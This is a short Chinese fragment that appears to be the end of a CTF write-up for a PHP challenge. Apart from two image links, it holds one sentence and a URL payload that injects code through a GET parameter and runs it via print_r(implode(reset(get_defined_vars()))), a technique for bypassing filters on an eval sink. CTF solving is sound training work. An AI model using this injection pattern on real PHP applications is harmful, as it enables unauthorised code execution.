![](../Images/77ce91935152addc901f1df4a23e383c.png)

最后使用implode将两个连起来。

http://dd343dd7.lxctf.net/index.php?1551=echo%201;//&code=print\_r(implode(reset(get\_defined\_vars())));

![](../Images/1fc528e74b14f7ed9e1bb1f62835fd8e.png)
